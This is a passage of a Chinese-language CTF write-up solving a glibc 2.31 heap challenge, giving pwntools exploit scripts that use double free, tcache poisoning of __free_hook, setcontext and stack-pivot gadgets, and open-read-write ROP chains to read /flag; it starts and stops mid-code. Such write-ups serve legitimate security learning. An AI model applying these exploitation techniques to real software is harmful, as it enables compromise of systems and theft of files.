sa(<span class="hljs-string">&#x27;name:&#x27;</span>,name)<br>    ru(<span class="hljs-string">&#x27;Done!\n&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_sex</span>(<span class="hljs-params">idx,sex</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;Current gender:&#x27;</span>)<br>    temp = uu64(r(<span class="hljs-number">6</span>))<br>    sla(<span class="hljs-string">&#x27;2.Girl:&#x27;</span>,<span class="hljs-built_in">str</span>(sex))<br>    <span class="hljs-keyword">return</span> temp<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">content_edit</span>(<span class="hljs-params">idx,data</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;description:&#x27;</span>,data)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br><br><span class="hljs-comment"># ----------------------------- 1 利用double free构造堆块重叠， 泄露heap和libc地址</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">6</span>-i)<br><span class="hljs-comment"># 合并进入usbin</span><br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># 从tcache中取出第一块分配</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># 将合并状态下的一部分chunk放入tcache，造成堆块重叠</span><br>free(<span class="hljs-number">8</span>)<br><span class="hljs-comment"># 再次申请，使放入tcache中的usbin chunk被分配，泄露堆地址</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>free(<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;nder: &#x27;</span>)<br>heap_addr = uu64(r(<span class="hljs-number">6</span>))<br>leak(heap_addr)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;nder: &#x27;</span>)<br>base = uu64(r(<span class="hljs-number">6</span>))<span class="hljs-number">-0x1ebbe0</span><br>leak(base)<br><br><span class="hljs-comment"># --------------------------- 2 构造堆块重叠，使得可以向chunk+8位置写入数据；令在堆块上布置setcontext链</span><br>open_addr  = base + sym(<span class="hljs-string">&#x27;open&#x27;</span>)<br>read_addr = base + sym(<span class="hljs-string">&#x27;read&#x27;</span>)<br>puts = base + sym(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>gadget = base + <span class="hljs-number">0x154930</span><br>free_hook = base + sym(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)<br>setcontext = base + sym(<span class="hljs-string">&#x27;setcontext&#x27;</span>) + <span class="hljs-number">61</span><br>p_rdi_r = base + <span class="hljs-number">0x26b72</span><br>p_rdx_r12_r = base + <span class="hljs-number">0x11c371</span><br>p_rsi_r = base + <span class="hljs-number">0x27529</span><br>leak(free_hook)<br>leak(gadget)<br><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>)<br>name_edit(<span class="hljs-number">0</span>,p64(heap_addr+<span class="hljs-number">0x380</span>)[:<span class="hljs-number">-1</span>])<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>pl = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>)<br>pl+= p64(<span class="hljs-number">0</span>) + p64(heap_addr+<span class="hljs-number">0x3a8</span><span class="hljs-number">-0x18</span>) <span class="hljs-comment"># 在chunk2的gender字段放置地址addr，令addr+0x28指向chunk2的des字段</span><br><br><span class="hljs-comment"># setcontext</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">gadget 0x154930</span><br><span class="hljs-string">    mov     rdx, [rdi+8]</span><br><span class="hljs-string">    mov     [rsp+0C8h+var_C8], rax</span><br><span class="hljs-string">    call    qword ptr [rdx+20h]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>pl+= p64(setcontext)<br>pl+= (<span class="hljs-number">0xa0</span>-<span class="hljs-built_in">len</span>(pl))*<span class="hljs-string">&#x27;\x00&#x27;</span> + p64(heap_addr+<span class="hljs-number">0x5d0</span>) + p64(p_rdi_r)<br>content_edit(<span class="hljs-number">9</span>,pl)<br><br><span class="hljs-comment"># ----------------------------------------------- 3 set gadget into free_hook</span><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br>name_edit(<span class="hljs-number">0</span>,p64(free_hook)[:<span class="hljs-number">-1</span>])<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,p64(gadget)[:<span class="hljs-number">-1</span>])<br><span class="hljs-comment"># ---------------------------------------------- 4 在堆块中布置rop链</span><br>pl = p64(heap_addr+<span class="hljs-number">0xb10</span>) + p64(p_rsi_r) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br><span class="hljs-comment"># 这里要注意选择open返回的fd指针</span><br>pl+= p64(p_rdi_r) + p64(<span class="hljs-number">4</span>) + p64(p_rsi_r) + p64(heap_addr+<span class="hljs-number">0x500</span>) + p64(p_rdx_r12_r) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(read_addr)<br>pl+= p64(p_rdi_r) + p64(heap_addr+<span class="hljs-number">0x500</span>) + p64(puts)<br>content_edit(<span class="hljs-number">4</span>,pl)<br>name_edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/flag\x00\x00&#x27;</span>)<br><br>command = <span class="hljs-string">&#x27;b *&#x27;</span>+ <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(gadget))+<span class="hljs-string">&#x27;\n&#x27;</span><br>dbg(command)<br><span class="hljs-comment"># ---------------------------------------------- 5 trigger</span><br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># end </span><br>itr()<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="解法2-gadget-栈迁移"><a href="#解法2-gadget-栈迁移" class="headerlink" title="解法2 - gadget+栈迁移"></a>解法2 - gadget+栈迁移</h3><p>解法1思路很清晰，但又要控制 <code>rdx</code>又要构造 <code>setcontext</code>，很麻烦，在这里介绍另一种解法，通过 gadget控制rbp的值，从而进行栈迁移，将栈劫持到我们可以控制的堆地址上，并执行预先布置的rop链，从而获取flag</p>
+<p>先介绍一下万金油的gadget <code>svcudp_reply+26</code>，汇编如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></div></td></tr></table></figure>
+
+<p>这个gadgets主要是通过 <code>rdi</code>控制 <code>rbp</code>进而控制 <code>rax</code>并执行跳转，由于我们已经控制了 <code>rbp</code>的值，因此只需要在 <code>rax+0x28</code>的位置部署 <code>leave；ret</code>即可完成栈迁移</p>
+<p>从而在我们已经布置好 <code>orw rop链</code>的位置伪造栈地址并劫持控制流，最终读取<code>flag</code></p>
+<p>在第一个解法中我并没有使用 <code>修改性别</code>的功能，而是全部通过堆块重叠来泄露地址，在这个解法中用到了 <code>修改性别</code>功能，其主要作用是可以更快捷的泄露地址，而且如果堆块已经被释放的话，<code>修改性别</code>会更改 <code>chunk+8</code>位置的指针，使得我们可以对其进行 <code>double free</code></p>
+<p>详见EXP</p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#__author__:N1K0_</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> inspect<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">var</span>):</span><br>    callers_local_vars = inspect.currentframe().f_back.f_locals.items()<br>    temp =  [var_name <span class="hljs-keyword">for</span> var_name, var_val <span class="hljs-keyword">in</span> callers_local_vars <span class="hljs-keyword">if</span> var_val <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]<br>    p.info(temp + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(var))<br><br>s      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>plt     = <span class="hljs-keyword">lambda</span> data               :elf.plt[data]<br>got     = <span class="hljs-keyword">lambda</span> data               :elf.got[data]<br>sym     = <span class="hljs-keyword">lambda</span> data               :libc.sym[data]<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>local_libc_32 = <span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>context.binary = binary<br>elf = ELF(binary,checksec=<span class="hljs-literal">False</span>)<br><br>p = process(binary)<br><span class="hljs-comment"># p = process([&quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;r&#x27;</span>:<br>        p = remote(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">1</span>)<br>libc = elf.libc<br><span class="hljs-comment"># libc = ELF(remote_libc)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    os.system(<span class="hljs-string">&#x27;tmux set mouse on&#x27;</span>)<br>    context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>    gdb.attach(p,cmd)<br>    pause()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">chunk_list = 0x40A0 </span><br><span class="hljs-string">chunk_list_flag = 0x04060</span><br><span class="hljs-string">gender_chance = 0x4010</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># start </span><br><span class="hljs-comment"># context.log_level = &#x27;DEBUG&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,sex,name</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;2.Girl:\n&#x27;</span>,<span class="hljs-built_in">str</span>(sex))<br>    sa(<span class="hljs-string">&quot;Please input your child&#x27;s name:\n&quot;</span>,name)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_edit</span>(<span class="hljs-params">idx,name</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;name:&#x27;</span>,name)<br>    ru(<span class="hljs-string">&#x27;Done!\n&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_sex</span>(<span class="hljs-params">idx,sex</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;Current gender:&#x27;</span>)<br>    temp = uu64(r(<span class="hljs-number">6</span>))<br>    sla(<span class="hljs-string">&#x27;2.Girl:&#x27;</span>,<span class="hljs-built_in">str</span>(sex))<br>    <span class="hljs-keyword">return</span> temp<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">content_edit</span>(<span class="hljs-params">idx,data</span>):</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;description:&#x27;</span>,data)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>():</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>)<br><br><span class="hljs-comment"># ----------------------------- 1 free and show; leak heap_addr</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>free(<span class="hljs-number">6</span>)<br>heap_addr = change_sex(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<br><span class="hljs-comment"># ---------------------------- 2 doble free 6; leak libc_base</span><br>free(<span class="hljs-number">6</span>) <span class="hljs-comment"># double free</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aa&#x27;</span>) <span class="hljs-comment"># 8 ==6</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i)<br>free(<span class="hljs-number">7</span>) <span class="hljs-comment"># now tcache is full; next chunk will be in the usbin</span><br>free(<span class="hljs-number">6</span>)<br>show(<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">&#x27;Name: &#x27;</span>)<br>base = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,<span class="hljs-literal">False</span>)) - <span class="hljs-number">0x1ebbe0</span><br><span class="hljs-comment"># ---------------------------- 3 set gadget to free_hook</span><br>gadget = base + <span class="hljs-number">0x157d8a</span><br>free_hook = base + sym(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)<br>free_addr = base + sym(<span class="hljs-string">&#x27;free&#x27;</span>)<br>open_addr  = base + sym(<span class="hljs-string">&#x27;open&#x27;</span>)<br>read_addr = base + sym(<span class="hljs-string">&#x27;read&#x27;</span>)<br>puts = base + sym(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment"># ret -&gt; mov rip, [rsp]; rsp + 8</span><br>leave_r = base + <span class="hljs-number">0x5aa48</span> <span class="hljs-comment"># mov rsp, rbp; pop rbp</span><br>P_rax_r = base + <span class="hljs-number">0x4a550</span><br>p_rsi_r = base + <span class="hljs-number">0x27529</span><br>p_rdi_r = base + <span class="hljs-number">0x26b72</span><br>p_rdx_r12_r = base + <span class="hljs-number">0x11c371</span><br>p_rdx_rbx_r = base + <span class="hljs-number">0x162866</span><br>P_rdx_rcx_rbx_r = base + <span class="hljs-number">0x1056fd</span><br>add_rsp_0x18_r=base + <span class="hljs-number">0x3794a</span><br>ret = base + <span class="hljs-number">0x25679</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(i,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-comment"># set 6 to tcache and 8 is still at the same position with 6</span><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">6</span>)<br><span class="hljs-comment"># tcache poison</span><br>name_edit(<span class="hljs-number">8</span>,p64(free_hook)[:<span class="hljs-number">-1</span>])<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,p64(gadget)[:<span class="hljs-number">-1</span>])<br><br><span class="hljs-comment"># -------------------------- 4 move stack to heap</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">0x157d8a</span><br><span class="hljs-string">    mov rbp, qword ptr [rdi + 0x48]; </span><br><span class="hljs-string">    mov rax, qword ptr [rbp + 0x18]; </span><br><span class="hljs-string">    lea r13, [rbp + 0x10]; </span><br><span class="hljs-string">    mov dword ptr [rbp + 0x10], 0; </span><br><span class="hljs-string">    mov rdi, r13; </span><br><span class="hljs-string">    call qword ptr [rax + 0x28];</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>stack_addr = heap_addr + <span class="hljs-number">0x900</span><br><span class="hljs-comment"># set rbp = chunk_des 6</span><br>pl = <span class="hljs-string">&#x27;/flag\x00&#x27;</span><br>pl = pl.ljust(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>pl+= p64(stack_addr)<br>pl+= p64(leave_r) <span class="hljs-comment"># rax + 0x28 call</span><br>content_edit(<span class="hljs-number">0</span>,pl)<br><br>pl = p64(ret) + p64(add_rsp_0x18_r)*<span class="hljs-number">2</span><br>pl+= p64(heap_addr + <span class="hljs-number">0xa10</span>+<span class="hljs-number">0x18</span>) <span class="hljs-comment"># rax</span><br>pl+= <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x8</span><br><span class="hljs-comment"># --------------------------- 5 set orw ropchains on fakestack</span><br><span class="hljs-comment"># orw chains</span><br><span class="hljs-comment"># open</span><br>pl+= p64(p_rdi_r)+p64(heap_addr+<span class="hljs-number">0x0a10</span>)+p64(p_rsi_r)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br><span class="hljs-comment"># read</span><br>pl+= p64(p_rdi_r)+p64(<span class="hljs-number">4</span>)+p64(p_rsi_r)+p64(heap_addr+<span class="hljs-number">0x3d0</span>)+p64(p_rdx_r12_r)+p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span>+p64(read_addr)<br><span class="hljs-comment"># puts</span><br>pl+= p64(p_rdi_r)+p64(heap_addr+<span class="hljs-number">0x3d0</span>)+p64(puts)<br>content_edit(<span class="hljs-number">6</span>,pl)<br><br>leak(free_hook)<br>leak(open_addr)<br>leak(read_addr)<br>leak(puts)<br>leak(gadget)<br>leak(heap_addr)<br>leak(base)<br>leak(leave_r)<br><br>comm = <span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(add_rsp_0x18_r))+<span class="hljs-string">&#x27;\n&#x27;</span><br>comm+= <span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(gadget)) + <span class="hljs-string">&#x27;\n&#x27;</span><br><br>dbg(comm)<br><br><span class="hljs-comment"># ---------------------------- 6 tigger</span><br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># end </span><br><br>itr()<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="解法3-通过environ泄露栈地址，并在栈上构造orw-rop链"><a href="#解法3-通过environ泄露栈地址，并在栈上构造orw-rop链" class="headerlink" title="解法3 - 通过environ泄露栈地址，并在栈上构造orw rop链"></a>解法3 - 通过environ泄露栈地址，并在栈上构造orw rop链</h3><p>在解法二当中我们是通过gadgets进行栈迁移，将原本的栈地址劫持到了堆上，但如果 <code>栈地址</code>已知的话，解题过程会更加简单，而且不需要特意去寻找万金油的gadgets</p>
+<p>那么如何泄露<code>栈地址</code>呢？</p>
+<p>其实程序的栈地址会存放在 <code>__environ</code>中，我们只要输出<code>__environ</code>的内容就能获取栈地址</p>
+<p>在获取到栈地址后，我在main函数的 <code>ret</code>处下一个断点，发现main函数返回值和我们泄露的栈地址正好相差 <code>0x100</code></p>
+<p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/image-20210401091919466.png" srcset="/img/loading.gif" lazyload alt="image-20210401091919466"></p>
+<p>之后的思路就比较清晰了，我们依旧通过 <code>tcache poison</code>的方式，将堆块申请到main函数返回的位置，布置 orw ropchain，之后通过 <code>退出</code>功能将程序控制流指向布置好的 ropchain，最后输出flag</p>
+<p>详见EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 